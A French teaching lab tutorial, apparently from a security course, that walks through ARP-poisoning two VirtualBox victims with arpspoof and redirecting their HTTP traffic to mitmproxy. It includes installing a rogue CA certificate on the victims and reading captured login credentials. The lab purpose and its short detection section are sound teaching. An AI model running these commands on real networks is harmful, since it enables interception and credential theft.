# Tutoriel Complet pour une Attaque Man-in-the-Middle avec Ubuntu 22.04 et VirtualBox

Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the-Middle (MITM) avec Ubuntu 22.04 sur VirtualBox, incluant toutes les étapes nécessaires, les configurations réseau, et les commandes.

# Pré-requis

- **Logiciel de virtualisation** : VirtualBox (téléchargeable depuis [ici](https://www.virtualbox.org/))
- **Système d'exploitation** : Ubuntu 22.04 LTS (téléchargeable depuis [ici](https://ubuntu.com/download/desktop))
- **Trois machines virtuelles** : Une machine attaquante et deux machines victimes

# Configuration des Machines Virtuelles dans VirtualBox

## Types de Machines

1. **Machine Attaquant (Attacker)** : Utilisée pour exécuter l'attaque MITM
2. **Machine Victime 1 (Victim 1)** : Première cible de l'attaque
3. **Machine Victime 2 (Victim 2)** : Deuxième cible de l'attaque

## Création des Machines Virtuelles

1. **Créer une nouvelle machine virtuelle** pour chaque rôle (Attacker, Victim1, Victim2) :
   - **Nom** : Attacker, Victim1, Victim2
   - **Type** : Linux
   - **Version** : Ubuntu (64-bit)
   - **Mémoire** : 2048 MB (recommandé)
   - **Disque dur** : Créez un disque virtuel (au moins 20 Go)

2. **Installer Ubuntu 22.04** sur chaque machine virtuelle :
   - Démarrez chaque machine virtuelle avec l'ISO d'Ubuntu pour l'installation.
   - Suivez les instructions d'installation d'Ubuntu.

## Configuration du Réseau

#### Configuration du Réseau avec Double Adaptateur

1. **Configurer les adaptateurs réseau** pour chaque machine dans VirtualBox :
   - **Machine Attaquant (Attacker)** :
     - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
     - Adapter 2 : NAT Network (nommé `natnet`, avec l'adresse réseau `10.0.2.0/24`)
   - **Machine Victime 1 (Victim 1)** et **Machine Victime 2 (Victim 2)** :
     - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
     - Adapter 2 : NAT Network (nommé `natnet`, avec l'adresse réseau `10.0.2.0/24`)

#### Configuration des Adresses IP Statiques pour le Réseau Interne

1. **Attribuer des adresses IP statiques** sur l'interface interne (enp0s8) :

   - Pour la machine `Attacker` :
     - Ouvrez un terminal et éditez le fichier `/etc/netplan/00-installer-config.yaml` :
       ```yaml
       network:
         version: 2
         ethernets:
           enp0s3:
             dhcp4: true
           enp0s8:
             dhcp4: no
             addresses:
               - 10.0.2.10/24
             nameservers:
               addresses:
                 - 8.8.8.8
       ```
     - Appliquez les changements :
       ```sh
       sudo netplan apply
       ```

   - Pour la machine `Victim1` :
     - Éditez le fichier `/etc/netplan/00-installer-config.yaml` :
       ```yaml
       network:
         version: 2
         ethernets:
           enp0s3:
             dhcp4: true
           enp0s8:
             dhcp4: no
             addresses:
               - 10.0.2.20/24
             nameservers:
               addresses:
                 - 8.8.8.8
             routes:
               - to: default
                 via: 10.0.2.10
       ```
     - Appliquez les changements :
       ```sh
       sudo netplan apply
       ```

   - Pour la machine `Victim2` :
     - Éditez le fichier `/etc/netplan/00-installer-config.yaml` :
       ```yaml
       network:
         version: 2
         ethernets:
           enp0s3:
             dhcp4: true
           enp0s8:
             dhcp4: no
             addresses:
               - 10.0.2.30/24
             nameservers:
               addresses:
                 - 8.8.8.8
             routes:
               - to: default
                 via: 10.0.2.10
       ```
     - Appliquez les changements :
       ```sh
       sudo netplan apply
       ```

2. **Vérifiez la connectivité entre les machines** en utilisant `ping` :
   - Depuis `Attacker` :
     ```sh
     ping 10.0.2.20
     ping 10.0.2.30
     ```
   - Depuis `Victim1` :
     ```sh
     ping 10.0.2.10
     ping 10.0.2.30
     ```
   - Depuis `Victim2` :
     ```sh
     ping 10.0.2.10
     ping 10.0.2.20
     ```

# Installation des Outils Nécessaires

# Sur la Machine Attaquant (Attacker)

1. **Mettre à jour le système** :
   ```sh
   sudo apt update -y
   ```

2. **Installer les outils nécessaires** :
   ```sh
   sudo apt install dsniff ettercap-text-only iptables mitmproxy -y
   ```

3. **Activer le transfert de paquets IP** :
   ```sh
   echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
   ```

# Sur les Machines Victimes (Victim1 et Victim2)

1. **Mettre à jour le système** :
   ```sh
   sudo apt update -y
   ```


# Machine ATTAQUANT ! 

## Étape 1 : Empoisonner les Tables ARP de Victim1

1. **Empoisonner la Table ARP de Victim1**

   - Exécutez la commande suivante sur la machine attaquant (`attacker`) :
     ```sh
     sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
     ```
## Étape 2 : Empoisonner les Tables ARP de Victim2
2. **Empoisonner la Table ARP de Victim2**

   - Ouvrez un nouveau terminal sur `attacker`.
   - Exécutez la commande suivante :
     ```sh
     sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
     ```

## Étape 3 : Configurer `iptables` pour Rediriger le Trafic HTTP

1. **Ouvrez un nouveau terminal sur `attacker`**.
2. **Exécutez la commande suivante pour rediriger le trafic HTTP vers `mitmproxy`** :
   ```sh
   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
   ```

## Étape 4 : Lancer un Proxy MITM

1. **Sur la machine attaquant, lancez `mitmproxy`** :
   ```sh
   sudo mitmweb -p 8080
   ```

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/86b6ef41-af7b-47f7-b787-b4bcfb2a2a28)


# IMPORTANT 1:
- Accéder à http://localhost:8081
- Cliquez sur le bouton mitmproxy
- Cliquez sur install Certificates
- Pour la première fois, vous auriez le message suivant :
  *If you can see this, traffic is not passing through mitmproxy*
- *Solution* : Configuer le proxy de votre machine attaquant en manuel sur l'adresse suivante: http://localhost:8080 ou http://127.0.0.1:8080 ou http://10.0.2.10:8080
- Revenir à l'interface et observer le traffic
- Ouvrir le navigateur de facebook
- Essayez de vous connecter (saisir votre username et password et connectez vous)
- Revenir à http://localhost:8081
- Dans l'onglet start, mettre le filtre sur facebook
- Cherchez le POST
- Observez le username et le password en texte claire

## ==> Nous allons refaire les mêmes manipulations sur les machines victimes

# IMPORTANT 2:
- Essayez de refaire les mêmes manipulations sur une machine victime.
- *Résultat :* ça ne fonctionne pas !
- *Solution* : Configurer le proxy de chacune des machines victimes en manuel pour pointer sur http://10.0.2.10 
- Revenir à l'interface et observer le traffic (*MACHINE ATTAQUANT*)
- Ouvrir le navigateur - page d'amazon (*MACHINE VICTIME*)
- Essayez de vous connecter (saisir votre username et password et connectez vous) (*MACHINE VICTIME*)
- Revenir à http://localhost:8081 (*MACHINE ATTAQUANT*)
- Dans l'onglet start, mettre le filtre sur amazon (*MACHINE ATTAQUANT http://localhost:8081*)
- Cherchez le verbe POST (*MACHINE ATTAQUANT - http://localhost:8081*)
- Observez le username et le password en texte claire (*MACHINE ATTAQUANT - http://localhost:8081*)

# IMPORTANT 3:
- Téléchargez le certificat en cliquant sur le bouton vert Get mitmproxy-ca-cert  (*MACHINE ATTAQUANT*)
- cd Downloads  (*MACHINE ATTAQUANT*)
- sudo cp mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt  (*MACHINE ATTAQUANT*)
- sudo update-ca-certificates  (*MACHINE ATTAQUANT*)
- cat mitmproxy-ca-cert.pem et copier (*MACHINE ATTAQUANT*)
- cd Downloads (*MACHINE VICTIME 1 ou 2 *)
- nano mitmproxy-ca-cert.pem et coller (*MACHINE VICTIME*)
- sudo cp mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt (*MACHINE VICTIME*)
- sudo update-ca-certificates  (*MACHINE VICTIME*)
## Autre méthode 
- scp mitmproxy-ca-cert.pem eleve@10.0.2.20:\tmp
- scp mitmproxy-ca-cert.pem eleve@10.0.2.30:\tmp
## Ensuite: 
- scp mitmproxy-ca-cert.pem eleve@10.0.2.20:\tmp
- cd /tmp
- sudo cp mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt
  
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/136346cb-7350-4d82-a459-6ee2ee0a2f23)

# Pour résumer : 
## Installer terminator dans la machine de l'attaquant et diviser en 4
- terminal 1 :  sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
- terminal 2 :  sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
- terminal 3 :  sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
- terminal 4 :  sudo mitmproxy -p 8080

  




### Vérification et Conclusion

1. **Tester l'Attaque** :
   - Sur `Victim1`, ouvrez un navigateur et accédez à un site web HTTP (non HTTPS).
   - Sur `attacker`, vous devriez voir le trafic intercepté dans `mitmproxy`.



2. **Arrêter l'Attaque** :
   - Arrêtez `arpspoof` et `mitmproxy` en utilisant `Ctrl + C`.
   - Réinitialisez les règles `iptables` :
     ```sh
     sudo iptables -t nat -F
     ```



### Résumé des Commandes

#### Machine Attaquant (Attacker)

```sh
# Activer le transfert IP
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Empoisonner les tables ARP
sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20

# Rediriger le trafic HTTP
sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080

# Lancer mitmproxy
sudo mitmproxy -p 8080

# Réinitialiser les règles iptables
sudo iptables -t nat -F
```

### Théorie et Explications Vulgarisées

#### Qu'est-ce qu'une Attaque Man-in-the-Middle (MITM) ?

Imaginez deux amis, Alice (Victim1) et Bob (Victim2), qui échangent des lettres. Mallory (Attacker) est

 un individu malveillant qui intercepte et lit toutes les lettres échangées entre Alice et Bob, et parfois il modifie le contenu des lettres avant de les envoyer à la destination prévue. Une attaque Man-in-the-Middle fonctionne de manière similaire en interceptant les communications entre deux parties.

#### Comment l'Attaque Fonctionne-t-elle ?

1. **Empoisonnement ARP** :
   - Mallory trompe Alice et Bob en leur faisant croire que son adresse (adresse MAC de Mallory) est celle de l'autre.
   - Résultat : Tout le trafic entre Alice et Bob passe par Mallory.

2. **Redirection du Trafic** :
   - Mallory redirige tout le trafic HTTP vers un proxy (mitmproxy) pour inspecter et éventuellement modifier les communications.

#### Détection et Mitigation

1. **Utiliser Wireshark pour Détecter** :
   - Wireshark est comme une caméra de sécurité qui enregistre tout ce qui se passe sur le réseau.
   - Vous pouvez capturer et analyser les paquets ARP pour détecter des anomalies.

2. **Configurer des Entrées ARP Statiques** :
   - Ajouter des entrées ARP statiques est comme fixer des étiquettes sur les boîtes aux lettres pour que les lettres (paquets) aillent toujours au bon endroit.
   - Utilisez les commandes `arp` pour ajouter des entrées ARP statiques sur les machines victimes.

En suivant ces étapes, vous pouvez configurer, exécuter et comprendre une attaque Man-in-the-Middle, tout en apprenant comment détecter et mitiger de telles attaques pour assurer la sécurité de votre réseau.


# Annexe 2: 

1. **Empoisonner la Table ARP de Victim1**

   - Exécutez la commande suivante sur la machine attaquant (`attacker`) :
     ```sh
     sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
     ```

2. **Empoisonner la Table ARP de Victim2**

   - Ouvrez un nouveau terminal sur `attacker`.
   - Exécutez la commande suivante :
     ```sh
     sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
     ```

### Étape 1 : Empoisonner les Tables ARP

L'objectif de cette étape est d'intercepter et de rediriger le trafic réseau entre deux machines victimes (Victim1 et Victim2) via la machine attaquante (Attacker). Cela permet à l'attaquant d'observer, enregistrer et potentiellement modifier les communications entre les victimes.

#### Contexte et Théorie

**Address Resolution Protocol (ARP)** : ARP est un protocole utilisé pour mapper une adresse IP à une adresse MAC. Par exemple, si Victim1 veut envoyer des données à Victim2, elle utilise ARP pour trouver l'adresse MAC de Victim2.

**Empoisonnement ARP** : Cette technique consiste à envoyer des messages ARP falsifiés sur le réseau. Ces messages associent l'adresse IP d'une victime à l'adresse MAC de l'attaquant, trompant ainsi les victimes pour qu'elles envoient leur trafic réseau à l'attaquant.

#### Vulgarisation de l'Empoisonnement ARP

Imaginez que deux amis, Alice (Victim1) et Bob (Victim2), s'envoient des lettres. Ils utilisent des étiquettes d'adresse pour s'assurer que les lettres vont à la bonne personne. Mallory (Attacker) décide d'intercepter les lettres. Elle envoie de fausses étiquettes à Alice et Bob, faisant croire à chacun d'eux que son adresse est celle de l'autre. Maintenant, toutes les lettres qu'Alice envoie à Bob passent d'abord par Mallory, et vice versa. Mallory peut lire ou même modifier les lettres avant de les transmettre à la destination correcte.

#### Commandes et Explications Détaillées

**Empoisonner la Table ARP de Victim1**

1. **Commande** :
   ```sh
   sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
   ```

   **Explication** :
   - `sudo` : Exécute la commande avec des privilèges administratifs.
   - `arpspoof` : Outil utilisé pour envoyer des réponses ARP falsifiées.
   - `-i enp0s8` : Spécifie l'interface réseau interne sur laquelle l'attaque est lancée.
   - `-t 10.0.2.20` : Cible de l'attaque (Victim1).
   - `10.0.2.30` : Adresse IP que l'attaquant veut usurper (Victim2).

   **Objectif** :
   - Cette commande envoie des réponses ARP à Victim1 (10.0.2.20), faisant croire que l'adresse MAC de l'attaquant est l'adresse MAC de Victim2 (10.0.2.30). Ainsi, Victim1 enverra tout son trafic destiné à Victim2 à l'attaquant.

**Empoisonner la Table ARP de Victim2**

1. **Ouvrez un nouveau terminal sur `attacker`**.

2. **Commande** :
   ```sh
   sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
   ```

   **Explication** :
   - `sudo` : Exécute la commande avec des privilèges administratifs.
   - `arpspoof` : Outil utilisé pour envoyer des réponses ARP falsifiées.
   - `-i enp0s8` : Spécifie l'interface réseau interne sur laquelle l'attaque est lancée.
   - `-t 10.0.2.30` : Cible de l'attaque (Victim2).
   - `10.0.2.20` : Adresse IP que l'attaquant veut usurper (Victim1).

   **Objectif** :
   - Cette commande envoie des réponses ARP à Victim2 (10.0.2.30), faisant croire que l'adresse MAC de l'attaquant est l'adresse MAC de Victim1 (10.0.2.20). Ainsi, Victim2 enverra tout son trafic destiné à Victim1 à l'attaquant.

#### Pourquoi Deux Commandes ?

Pour que l'attaque soit réussie, l'attaquant doit tromper les deux victimes en même temps :
- **Victim1** doit penser que l'adresse MAC de l'attaquant est celle de **Victim2**.
- **Victim2** doit penser que l'adresse MAC de l'attaquant est celle de **Victim1**.

Cela permet à l'attaquant de recevoir et de rediriger tout le trafic entre les deux victimes, créant ainsi une position Man-in-the-Middle.

#### Résumé

L'empoisonnement ARP est une méthode permettant à un attaquant d'intercepter et de rediriger le trafic réseau entre deux machines en envoyant des messages ARP falsifiés. Les commandes `arpspoof` sont utilisées pour tromper les machines victimes et rediriger leur trafic vers l'attaquant, permettant ainsi à l'attaquant de surveiller et potentiellement modifier les communications entre les victimes.


# Annexe 3 - manipulation supplémentaire: 

### Utilisation d'un Port Alternatif pour mitmproxy

Installez Apache sur le port 80 et que vous souhaitez utiliser mitmproxy, vous devez choisir un autre port pour mitmproxy. Par exemple, vous pouvez utiliser le port 8081.

Voici comment configurer et exécuter l'attaque Man-in-the-Middle (MITM) avec mitmproxy écoutant sur le port 8081 :

#### Étapes à Suivre

1. **Empoisonner les Tables ARP**

   **Empoisonner la Table ARP de Victim1**
   ```sh
   sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
   ```

   **Empoisonner la Table ARP de Victim2**
   ```sh
   sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
   ```

2. **Redirection du Trafic HTTP avec iptables**

   Utilisez le port 8081 pour mitmproxy au lieu du port 8080 :
   ```sh
   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8081
   ```

3. **Lancer mitmproxy sur le port 8081**

   - **Lancer mitmproxy** :
     ```sh
     sudo mitmproxy -p 8081
     ```

   - **Lancer mitmweb** (alternative avec interface web) :
     ```sh
     sudo mitmweb -p 8081
     ```

4. **Accéder à l'interface web de mitmweb**

   Si vous utilisez `mitmweb`, ouvrez un navigateur et allez à `http://localhost:8081` pour accéder à l'interface web de mitmweb.

### Exemple Complet de Commandes

#### Machine Attaquant (Attacker)

1. **Empoisonner les Tables ARP**
   ```sh
   sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
   sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
   ```

2. **Redirection du Trafic HTTP vers le port 8081**
   ```sh
   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8081
   ```

3. **Lancer mitmproxy ou mitmweb sur le port 8081**
   - **mitmproxy** :
     ```sh
     sudo mitmproxy -p 8081
     ```
   - **mitmweb** (avec interface web) :
     ```sh
     sudo mitmweb -p 8081
     ```

### Explications Vulgarisées

#### Qu'est-ce qu'une Attaque Man-in-the-Middle (MITM) ?

Imaginez deux amis, Alice (Victim1) et Bob (Victim2), qui échangent des lettres. Mallory (Attacker) est un individu malveillant qui intercepte et lit toutes les lettres échangées entre Alice et Bob, et parfois il modifie le contenu des lettres avant de les envoyer à la destination prévue. Une attaque Man-in-the-Middle fonctionne de manière similaire en interceptant les communications entre deux parties.

#### Comment l'Attaque Fonctionne-t-elle ?

1. **Empoisonnement ARP** :
   - Mallory trompe Alice et Bob en leur faisant croire que son adresse (adresse MAC de Mallory) est celle de l'autre.
   - Résultat : Tout le trafic entre Alice et Bob passe par Mallory.

2. **Redirection du Trafic** :
   - Mallory redirige tout le trafic HTTP vers un proxy (mitmproxy) pour inspecter et éventuellement modifier les communications.

### Résumé des Commandes

#### Machine Attaquant (Attacker)

```sh
# Activer le transfert IP
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Empoisonner les tables ARP
sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20

# Rediriger le trafic HTTP vers le port 8081
sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8081

# Lancer mitmproxy ou mitmweb sur le port 8081
sudo mitmproxy -p 8081
# ou
sudo mitmweb -p 8081
```

En suivant ces étapes, vous pouvez configurer correctement `mitmproxy` ou `mitmweb` pour intercepter et visualiser le trafic HTTP entre les machines victimes, même si le port 80 est déjà utilisé par Apache.
